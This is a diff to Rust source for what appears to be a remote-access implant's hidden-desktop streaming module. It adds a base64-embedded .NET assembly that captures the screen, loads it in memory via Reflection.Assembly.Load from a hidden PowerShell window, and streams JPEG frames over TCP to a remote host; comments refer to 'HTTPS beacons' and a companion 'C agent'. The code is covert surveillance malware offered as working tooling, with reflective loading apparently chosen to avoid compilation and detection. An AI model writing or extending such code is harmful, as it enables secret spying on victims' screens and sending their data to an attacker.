@@ -4,6 +4,11 @@ use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use base64::{engine::general_purpose::STANDARD, Engine as _};
 
+// Pre-compiled .NET assembly (Mono/mcs, targets .NET 4.0) that exports SC::Cap() → Bitmap.
+// Loaded at runtime via Reflection.Assembly.Load($bytes) — no C# compilation needed,
+// which avoids the Add-Type -Language CSharp hang under concurrent PS processes.
+const CAP_DLL_B64: &str = "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bABsAAAAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAACANQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";
+
 const VNC_FRAME: u8 = 0x01;
 const VNC_INFO:  u8 = 0x02;
 const VNC_PONG:  u8 = 0x03;
@@ -53,6 +58,7 @@ unsafe fn sock_send_frame(sock: usize, typ: u8, payload: &[u8]) -> bool {
 #[cfg(target_os = "windows")]
 fn vnc_tcp_reader(sock: usize, stop: Arc<AtomicBool>) {
     use windows_sys::Win32::Networking::WinSock::{recv, WSAGetLastError};
+    vnc_log("tcp_reader: start");
     let mut buf = [0u8; 256];
     let mut pending: Vec<u8> = Vec::with_capacity(64);
     loop {
@@ -62,6 +68,7 @@ fn vnc_tcp_reader(sock: usize, stop: Arc<AtomicBool>) {
             // WSAETIMEDOUT (10060) or WSAEWOULDBLOCK (10035): timeout, retry
             let err = unsafe { WSAGetLastError() };
             if err == 10060 || err == 10035 { continue; }
+            vnc_log(&format!("tcp_reader: recv err={} n={}", err, n));
             break; // EOF or real error
         }
         pending.extend_from_slice(&buf[..n as usize]);
@@ -91,7 +98,9 @@ fn vnc_ps_reader(sock: usize, h_read: isize, stop: Arc<AtomicBool>) {
     use windows_sys::Win32::Storage::FileSystem::ReadFile;
     use windows_sys::Win32::System::Pipes::PeekNamedPipe;
 
-    let mut line_buf = vec![0u8; 4 * 1024 * 1024]; // 4MB (smaller = less risk)
+    vnc_log("ps_reader: start");
+    let mut line_buf = vec![0u8; 1024 * 1024]; // 1MB sliding buffer
+    vnc_log("ps_reader: buf allocated");
     let mut line_pos: usize = 0;
     let mut sent_info = false;
 
@@ -104,7 +113,8 @@ fn vnc_ps_reader(sock: usize, h_read: isize, stop: Arc<AtomicBool>) {
             PeekNamedPipe(h_read, std::ptr::null_mut(), 0, std::ptr::null_mut(), &mut avail, std::ptr::null_mut())
         };
         if peek_ok == 0 {
-            vnc_log("ps_reader: pipe broken");
+            let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
+            vnc_log(&format!("ps_reader: pipe broken err={}", err));
             break;
         }
 
@@ -129,7 +139,8 @@ fn vnc_ps_reader(sock: usize, h_read: isize, stop: Arc<AtomicBool>) {
             )
         };
         if ok == 0 || nr == 0 {
-            vnc_log("ps_reader: read error");
+            let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
+            vnc_log(&format!("ps_reader: read error ok={} nr={} err={}", ok, nr, err));
             break;
         }
         line_pos += nr as usize;
@@ -221,7 +232,7 @@ fn vnc_ps_reader(sock: usize, h_read: isize, stop: Arc<AtomicBool>) {
 fn vnc_session(host: &str, port: u16, quality: u8, stop: Arc<AtomicBool>) {
     use windows_sys::Win32::Foundation::{CloseHandle, TRUE, FALSE, INVALID_HANDLE_VALUE};
     use windows_sys::Win32::Networking::WinSock::{
-        WSAStartup, WSACleanup, socket, connect, closesocket,
+        WSAStartup, socket, connect, closesocket,
         WSADATA, SOCKADDR_IN, AF_INET, SOCK_STREAM, IPPROTO_TCP,
         INVALID_SOCKET,
     };
@@ -236,7 +247,9 @@ fn vnc_session(host: &str, port: u16, quality: u8, stop: Arc<AtomicBool>) {
 
     vnc_log("step1: session start");
 
-    // Initialize WinSock
+    // Initialize WinSock — do NOT call WSACleanup on exit; the transport
+    // layer (WinHTTP) uses the same per-process WSA reference count and
+    // calling WSACleanup would bring it to 0, breaking HTTPS beacons.
     let mut wsd: WSADATA = unsafe { std::mem::zeroed() };
     unsafe { WSAStartup(0x0202, &mut wsd) };
 
@@ -244,7 +257,6 @@ fn vnc_session(host: &str, port: u16, quality: u8, stop: Arc<AtomicBool>) {
     let sock = unsafe { socket(AF_INET as i32, SOCK_STREAM as i32, IPPROTO_TCP as i32) };
     if sock == INVALID_SOCKET {
         vnc_log("step1: socket() failed");
-        unsafe { WSACleanup() };
         return;
     }
 
@@ -267,7 +279,7 @@ fn vnc_session(host: &str, port: u16, quality: u8, stop: Arc<AtomicBool>) {
     };
     if connect_ret != 0 {
         vnc_log("step1: connect() failed");
-        unsafe { closesocket(sock); WSACleanup() };
+        unsafe { closesocket(sock) };
         return;
     }
     vnc_log("step2: tcp connected");
@@ -284,45 +296,28 @@ fn vnc_session(host: &str, port: u16, quality: u8, stop: Arc<AtomicBool>) {
         );
     };
 
-    // Build PowerShell command (same as C agent)
+    // Build PowerShell command — loads pre-compiled DLL via Reflection.Assembly.Load
     let ps_raw = format!(
         "$q={q};\
 Add-Type -AssemblyName System.Drawing;\
-Add-Type -TypeDefinition '\
-using System;using System.Drawing;using System.Drawing.Imaging;using System.Runtime.InteropServices;\
-public class SC{{\
-[DllImport(\\\"user32.dll\\\")] static extern IntPtr GetDesktopWindow();\
-[DllImport(\\\"user32.dll\\\")] static extern IntPtr GetWindowDC(IntPtr h);\
-[DllImport(\\\"user32.dll\\\")] static extern int ReleaseDC(IntPtr h,IntPtr d);\
-[DllImport(\\\"gdi32.dll\\\")] static extern bool BitBlt(IntPtr d,int x,int y,int w,int h,IntPtr s,int sx,int sy,uint r);\
-[DllImport(\\\"user32.dll\\\")] static extern int GetSystemMetrics(int i);\
-public static Bitmap Cap(){{\
-int w=GetSystemMetrics(0);int h=GetSystemMetrics(1);\
-if(w==0)w=1024;if(h==0)h=768;\
-IntPtr hw=GetDesktopWindow();IntPtr dc=GetWindowDC(hw);\
-Bitmap bmp=new Bitmap(w,h);\
-using(Graphics g=Graphics.FromImage(bmp)){{\
-IntPtr md=g.GetHdc();\
-BitBlt(md,0,0,w,h,dc,0,0,(uint)0x00CC0020);\
-g.ReleaseHdc(md);\
-}}\
-ReleaseDC(hw,dc);return bmp;\
-}}\
-}}' -Language CSharp -ReferencedAssemblies 'System.Drawing';\
+$d=[Convert]::FromBase64String('{dll}');\
+$a=[Reflection.Assembly]::Load($d);\
+$SC=$a.GetType('SC');\
 while($true){{\
 try{{\
-$bmp=[SC]::Cap();\
-$ms=[System.IO.MemoryStream]::new();\
-$ec=[System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object{{$_.MimeType-eq'image/jpeg'}};\
-$ep=[System.Drawing.Imaging.EncoderParameters]::new(1);\
-$ep.Param[0]=[System.Drawing.Imaging.EncoderParameter]::new([System.Drawing.Imaging.Encoder]::Quality,[long]$q);\
+$bmp=$SC.GetMethod('Cap').Invoke($null,$null);\
+$ms=[IO.MemoryStream]::new();\
+$ec=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|Where-Object{{$_.MimeType-eq'image/jpeg'}};\
+$ep=[Drawing.Imaging.EncoderParameters]::new(1);\
+$ep.Param[0]=[Drawing.Imaging.EncoderParameter]::new([Drawing.Imaging.Encoder]::Quality,[long]$q);\
 $bmp.Save($ms,$ec,$ep);\
 $w=$bmp.Width;$h=$bmp.Height;$b=[Convert]::ToBase64String($ms.ToArray());\
 [Console]::Out.WriteLine($w.ToString()+','+$h.ToString()+','+$b);\
 $bmp.Dispose();$ms.Dispose()\
 }}catch{{}};\
 Start-Sleep -Milliseconds 66}}",
-        q = quality
+        q = quality,
+        dll = CAP_DLL_B64,
     );
     let ps_cmd = format!(
         "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"{}\"",
@@ -342,7 +337,7 @@ Start-Sleep -Milliseconds 66}}",
     let mut h_write: isize = INVALID_HANDLE_VALUE;
     if unsafe { CreatePipe(&mut h_read, &mut h_write, &mut sa, 0) } == FALSE {
         vnc_log("step3: pipe fail");
-        unsafe { closesocket(sock); WSACleanup() };
+        unsafe { closesocket(sock) };
         return;
     }
 
@@ -372,7 +367,7 @@ Start-Sleep -Milliseconds 66}}",
     unsafe { CloseHandle(h_write); }
     if created == FALSE {
         vnc_log("step3: process fail");
-        unsafe { CloseHandle(h_read); closesocket(sock); WSACleanup() };
+        unsafe { CloseHandle(h_read); closesocket(sock) };
         return;
     }
     unsafe { CloseHandle(pi.hThread); }
@@ -407,7 +402,7 @@ Start-Sleep -Milliseconds 66}}",
         CloseHandle(pi.hProcess);
         CloseHandle(h_read);
         closesocket(sock);
-        WSACleanup();
+        // WSACleanup intentionally omitted — see WSAStartup comment above
     }
     vnc_log("step6: cleanup done");
 }
